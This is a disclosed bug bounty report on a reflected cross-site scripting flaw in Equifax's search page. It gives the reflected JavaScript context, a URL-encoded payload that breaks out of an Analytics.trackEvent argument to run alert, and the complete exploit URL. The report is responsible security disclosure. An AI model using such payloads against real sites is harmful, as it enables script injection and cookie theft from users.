# reflected XSS in [www.equifax.com]

## Report Details
- **Report ID**: 1818172
- **URL**: https://hackerone.com/reports/1818172
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-12-28T20:06:27.578Z
- **Disclosed**: 2023-04-23T12:40:15.348Z

## Reporter
- **Username**: abdoubouanik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: equifax

## Vulnerability Information
hi , I hope you are well, i found reflected XSS in this endpoint via ```q```  parameter:
```https://www.equifax.com/personal/search?q=broook```

###Steps:

1. open ```https://www.equifax.com/personal/search?q=broook```
2. view the source code of the page and search for word broook you will find that it reflected in the source code: 
{F2094877}

-
-

3. ```broook``` word reflected in javascript code:
```
<script type="text/javascript">

var pageProduct = null;
window.onload = function(e){ 
		
		Analytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: "broook" , numOfSearchResultsReturned: 1});
	
}
</script>

```
-
-

4. By using this payload ```%22%20%2C%20internalSearchTerm%3A%20%5B"broook"%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b``` , I modified the parameters of the ```Analytics.trackEvent``` function to be like this:
```
<script type="text/javascript">

var pageProduct = null;
window.onload = function(e){ 
		
		Analytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: "" , internalSearchTerm: ["broook"].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 1});
	
}
</script>
```
{F2094892}

-
-

5. the following is the link with my XSS payload:   https://www.equifax.com/personal/search?q=%22%20%2C%20internalSearchTerm%3A%20%5B"broook"%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b

{F2094902}

## Impact

an attacker can exeute JS codes on the victims and this could be steal user's cookies

## Attachments
- Screenshot_2022-12-28_20-43-33.png
- Screenshot_2022-12-28_20-56-04.png
- Screenshot_2022-12-28_20-54-41.png
